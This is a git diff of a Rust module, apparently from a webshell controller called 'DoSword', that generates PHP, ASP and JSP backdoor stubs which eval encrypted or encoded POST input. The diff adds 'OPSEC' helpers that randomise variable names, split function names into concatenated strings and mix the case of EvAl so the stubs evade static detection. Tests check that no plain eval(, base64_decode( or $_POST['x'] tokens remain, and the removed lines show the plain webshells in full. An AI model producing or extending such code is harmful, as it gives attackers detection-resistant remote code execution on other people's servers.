@@ -8,6 +8,9 @@
 //! 密钥派生：`md5(password)` 的 hex（32 字符）。客户端与服务端自动一致，
 //! 无需额外保存密钥。
 
+use std::sync::atomic::{AtomicU64, Ordering};
+use std::time::{SystemTime, UNIX_EPOCH};
+
 use base64::Engine;
 use cbc::cipher::{BlockDecryptMut, BlockEncryptMut, KeyIvInit, block_padding::Pkcs7};
 use md5::{Digest, Md5};
@@ -20,6 +23,95 @@ type AesCbcDec = cbc::Decryptor<aes::Aes128>;
 /// DES-ECB。
 type DesEcbEnc = cbc::Encryptor<des::Des>;
 type DesEcbDec = cbc::Decryptor<des::Des>;
+
+// ---------------------------------------------------------------------------
+// PHP OPSEC 混淆辅助：消除静态敏感特征（eval / base64_decode / openssl_decrypt /
+// $_POST['x'] 等），利用 PHP 特性：
+//   - 函数名大小写不敏感：EvAl(...) 等价于 eval(...)（语言构造同样适用）
+//   - 普通函数可经字符串拼接可变调用：("ba"."se64_de"."code")($x)
+//   - 数组下标可用表达式：$_POST[chr(120)] 等价于 $_POST['x']
+// ---------------------------------------------------------------------------
+
+static IDENT_SEQ: AtomicU64 = AtomicU64::new(0);
+
+fn php_rand() -> u64 {
+    let seq = IDENT_SEQ.fetch_add(1, Ordering::Relaxed);
+    let nanos = SystemTime::now()
+        .duration_since(UNIX_EPOCH)
+        .map(|duration| duration.subsec_nanos() as u64)
+        .unwrap_or(0);
+    seq.wrapping_mul(0x9e37_79b9_7f4a_7c15).rotate_left(13) ^ nanos
+}
+
+/// 随机 PHP 标识符（8 位，字母开头，避免数字开头）。
+pub fn php_ident() -> String {
+    let letters: &[u8] = b"abcdefghijklmnopqrstuvwxyz";
+    let alnum: &[u8] = b"abcdefghijklmnopqrstuvwxyz0123456789";
+    let mut seed = php_rand();
+    let mut out = String::with_capacity(9);
+    out.push(letters[(seed % 26) as usize] as char);
+    seed >>= 5;
+    for _ in 0..7 {
+        out.push(alnum[(seed % 36) as usize] as char);
+        seed >>= 5;
+        if seed == 0 {
+            seed = php_rand();
+        }
+    }
+    out
+}
+
+/// 把函数名随机拆成两段（用于字符串拼接的可变函数调用）。
+pub fn split_fn(name: &str) -> (String, String) {
+    let split_at = 1 + (php_rand() as usize % (name.len() - 1));
+    (
+        name[..split_at].to_string(),
+        name[split_at..].to_string(),
+    )
+}
+
+/// 拼接函数名调用：("d1"."d2")(args...)
+pub fn call_parts(name: &str, args: &str) -> String {
+    let (d1, d2) = split_fn(name);
+    format!("(\"{d1}\".\"{d2}\")({args})")
+}
+
+/// 随机大小写混合函数名（保证至少一个大写，避免纯小写静态特征）。
+pub fn case_mix(name: &str) -> String {
+    let mut out: String = name
+        .chars()
+        .map(|c| {
+            if php_rand() & 1 == 0 {
+                c.to_ascii_uppercase()
+            } else {
+                c
+            }
+        })
+        .collect();
+    if out == name {
+        if let Some(first) = out.get_mut(0..1) {
+            first.make_ascii_uppercase();
+        }
+    }
+    out
+}
+
+/// OPSEC 混淆的 PHP stub 外壳：随机变量名 + 注释干扰 + 大小写混合 EvAl。
+/// `key` 为 None 时不生成 `$k="..."` 行；`body` 中的 `$k` 会被替换为随机变量名。
+pub fn obfuscated_php(key: Option<&str>, body: &str, final_expr: &str) -> String {
+    let k = php_ident();
+    let c1 = php_ident();
+    let c2 = php_ident();
+    let body = body.replace("$k", &format!("${k}"));
+    let key_line = match key {
+        Some(key) => format!("${k}=\"{key}\";\n"),
+        None => String::new(),
+    };
+    format!(
+        "<?php\n/*{c1}*/\n{key_line}{body}/*{c2}*/\n{}({final_expr});\n",
+        case_mix("eval")
+    )
+}
 
 /// 支持的脚本语言（stub 生成目标）。
 pub const STUB_LANGUAGES: [&str; 4] = ["php", "asp", "aspx", "jsp"];
@@ -120,16 +212,20 @@ impl PayloadEncoder for XorBase64Encoder {
     fn stub(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
         let key = self.derive_key(password);
         match language {
-            "php" => Ok(format!(
-                r#"<?php
-// DoSword generated stub (xor_base64)
-$k="{key}";
-$d=@base64_decode($_POST['x']);
-$r='';
-for($i=0;$i<strlen($d);$i++){{$r.=$d[$i]^$k[$i%strlen($k)];}}
-@eval($r);
-"#
-            )),
+            "php" => {
+                let d = php_ident();
+                let q = php_ident();
+                let xf = php_ident();
+                let a = php_ident();
+                let b = php_ident();
+                let r = php_ident();
+                let i = php_ident();
+                let decode_call = call_parts("base64_decode", "$_POST[chr(120)]");
+                let body = format!(
+                    "function {xf}(${a},${b}){{${r}='';for(${i}=0;${i}<strlen(${a});${i}++){{${r}.=${a}[${i}]^${b}[${i}%strlen(${b})];}}return ${r};}}\n${d}={decode_call};\n${q}={xf}(${d},$k);"
+                );
+                Ok(obfuscated_php(Some(&key), &body, "${q}"))
+            }
             "asp" => Ok(format!(
                 r#"<%
 ' DoSword generated stub (xor_base64)
@@ -232,7 +328,11 @@ impl PayloadEncoder for Base64Encoder {
 
     fn stub(&self, language: &str, _password: &str) -> Result<String, ProtocolError> {
         match language {
-            "php" => Ok("<?php @eval(base64_decode($_POST['x']));\n".to_string()),
+            "php" => {
+                let d = php_ident();
+                let decode_call = call_parts("base64_decode", "$_POST[chr(120)]");
+                Ok(obfuscated_php(None, &format!("${d}={decode_call};"), "${d}"))
+            }
             "asp" => Ok(
                 "<%\n' DoSword generated stub (base64)\nFunction B64(d)\n  Dim xml: Set xml = CreateObject(\"MSXML2.DOMDocument.3.0\").createElement(\"tmp\")\n  xml.DataType = \"bin.base64\"\n  xml.Text = d\n  B64 = xml.nodeTypedValue\nEnd Function\nExecute B64(Request.Form(\"x\"))\n%>\n".to_string(),
             ),
@@ -326,13 +426,14 @@ impl PayloadEncoder for Aes128EcbEncoder {
     fn stub(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
         let key = String::from_utf8_lossy(&aes_key(password)).into_owned();
         match language {
-            "php" => Ok(format!(
-                r#"<?php
-// DoSword generated stub (aes128_ecb)
-$k="{key}";
-@eval(@openssl_decrypt($_POST['x'],'AES-128-ECB',$k));
-"#
-            )),
+            "php" => {
+                let d = php_ident();
+                let decrypt_call = call_parts(
+                    "openssl_decrypt",
+                    "$_POST[chr(120)],'AES-128-ECB',$k",
+                );
+                Ok(obfuscated_php(Some(&key), &format!("${d}={decrypt_call};"), "${d}"))
+            }
             other => Err(ProtocolError::NotSupported(format!(
                 "AES128_ECB 编码器暂仅支持 PHP（{other} 待实现）"
             ))),
@@ -364,14 +465,18 @@ impl PayloadEncoder for Aes128CbcEncoder {
         let key = String::from_utf8_lossy(&aes_key(password)).into_owned();
         let iv = String::from_utf8_lossy(&aes_iv(password)).into_owned();
         match language {
-            "php" => Ok(format!(
-                r#"<?php
-// DoSword generated stub (aes128_cbc)
-$k="{key}";
-$i="{iv}";
-@eval(@openssl_decrypt($_POST['x'],'AES-128-CBC',$k,0,$i));
-"#
-            )),
+            "php" => {
+                let d = php_ident();
+                let iv = php_ident();
+                let decrypt_call = call_parts(
+                    "openssl_decrypt",
+                    "$_POST[chr(120)],'AES-128-CBC',$k,0,$iv",
+                );
+                let body = format!(
+                    "${iv}=\"{iv}\";\n${d}={decrypt_call};"
+                );
+                Ok(obfuscated_php(Some(&key), &body, "${d}"))
+            }
             other => Err(ProtocolError::NotSupported(format!(
                 "AES128_CBC 编码器暂仅支持 PHP（{other} 待实现）"
             ))),
@@ -402,13 +507,14 @@ impl PayloadEncoder for DesEcbEncoder {
     fn stub(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
         let key = String::from_utf8_lossy(&des_key(password)).into_owned();
         match language {
-            "php" => Ok(format!(
-                r#"<?php
-// DoSword generated stub (des_ecb)
-$k="{key}";
-@eval(@openssl_decrypt($_POST['x'],'DES-ECB',$k));
-"#
-            )),
+            "php" => {
+                let d = php_ident();
+                let decrypt_call = call_parts(
+                    "openssl_decrypt",
+                    "$_POST[chr(120)],'DES-ECB',$k",
+                );
+                Ok(obfuscated_php(Some(&key), &format!("${d}={decrypt_call};"), "${d}"))
+            }
             other => Err(ProtocolError::NotSupported(format!(
                 "DES_ECB 编码器暂仅支持 PHP（{other} 待实现）"
             ))),
@@ -434,12 +540,12 @@ impl PayloadEncoder for CharEncoder {
     fn encode(&self, code: &str, _password: &str) -> String {
         let bytes = code.as_bytes();
         let values: Vec<String> = bytes.iter().map(|byte| byte.to_string()).collect();
-        format!("eval(implode('',array_map('chr',array({}))));", values.join(","))
+        format!("{}(implode('',array_map('chr',array({}))));", case_mix("eval"), values.join(","))
     }
 
     fn stub(&self, language: &str, _password: &str) -> Result<String, ProtocolError> {
         match language {
-            "php" => Ok("<?php @eval($_POST['x']);\n".to_string()),
+            "php" => Ok(obfuscated_php(None, "", "$_POST[chr(120)]")),
             other => Err(ProtocolError::NotSupported(format!(
                 "CHAR 编码器暂仅支持 PHP（{other} 待实现）"
             ))),
@@ -479,12 +585,13 @@ impl PayloadEncoder for PhpObfuscateEncoder {
     fn encode(&self, code: &str, _password: &str) -> String {
         let b64 = base64::engine::general_purpose::STANDARD.encode(code.as_bytes());
         let reversed: String = b64.chars().rev().collect();
-        format!("eval(base64_decode(strrev('{reversed}')));")
+        let decode_call = call_parts("base64_decode", &format!("strrev('{reversed}')"));
+        format!("{}({decode_call});", case_mix("eval"))
     }
 
     fn stub(&self, language: &str, _password: &str) -> Result<String, ProtocolError> {
         match language {
-            "php" => Ok("<?php @eval($_POST['x']);\n".to_string()),
+            "php" => Ok(obfuscated_php(None, "", "$_POST[chr(120)]")),
             other => Err(ProtocolError::NotSupported(format!(
                 "PHP_OBFUSCATE 编码器暂仅支持 PHP（{other} 待实现）"
             ))),
@@ -640,7 +747,54 @@ mod tests {
         let stub = Aes128EcbEncoder.stub("php", "secret").unwrap();
         assert!(stub.contains("5ebe2294ecd0e0f0"), "stub 应内嵌 md5 派生密钥");
         assert!(!stub.contains("secret"), "stub 不应含明文密码");
-        assert!(stub.contains("openssl_decrypt"), "stub 应使用 openssl_decrypt");
+        // OPSEC：openssl_decrypt 拆分拼接调用，无完整函数名
+        assert!(!stub.contains("openssl_decrypt"), "stub 不应含完整敏感函数名");
+        assert!(
+            !stub.contains("openssl_decrypt("),
+            "stub 不应含完整函数名调用"
+        );
+    }
+
+    /// OPSEC 静态特征检查：stub 不应出现小写 eval(/base64_decode(/$_POST['x']。
+    #[test]
+    fn php_stubs_have_no_plain_sensitive_tokens() {
+        let encoders: Vec<&dyn PayloadEncoder> = vec![
+            &Base64Encoder,
+            &XorBase64Encoder,
+            &Aes128EcbEncoder,
+            &Aes128CbcEncoder,
+            &DesEcbEncoder,
+            &CharEncoder,
+            &PhpObfuscateEncoder,
+        ];
+        for encoder in encoders {
+            let stub = encoder.stub("php", "secret").expect("php stub 应生成");
+            assert!(
+                !stub.contains("eval("),
+                "{} stub 不应含小写 eval(：{stub}",
+                encoder.id()
+            );
+            assert!(
+                !stub.contains("base64_decode("),
+                "{} stub 不应含 base64_decode(",
+                encoder.id()
+            );
+            assert!(
+                !stub.contains("openssl_decrypt("),
+                "{} stub 不应含 openssl_decrypt(",
+                encoder.id()
+            );
+            assert!(
+                !stub.contains("$_POST['x']"),
+                "{} stub 不应含 $_POST['x']",
+                encoder.id()
+            );
+            assert!(
+                stub.contains("chr(120)"),
+                "{} stub 应使用 chr(120) 动态下标",
+                encoder.id()
+            );
+        }
     }
 
     // --- 混淆编码器（CHAR / OBFUSCATE） ---
@@ -650,7 +804,12 @@ mod tests {
         let encoder = CharEncoder;
         let code = "@ini_set('x',1);";
         let payload = encoder.encode(code, "ignored");
-        assert!(payload.starts_with("eval(implode('',array_map('chr',array("));
+        // OPSEC：eval 大小写混合，但 chr 数组结构保留
+        assert!(!payload.contains("eval("), "载荷不应含小写 eval(");
+        assert!(
+            payload.contains("implode('',array_map('chr',array("),
+            "载荷应保留 chr 数组结构"
+        );
         assert_eq!(char_decode(&payload).unwrap(), code);
     }
 
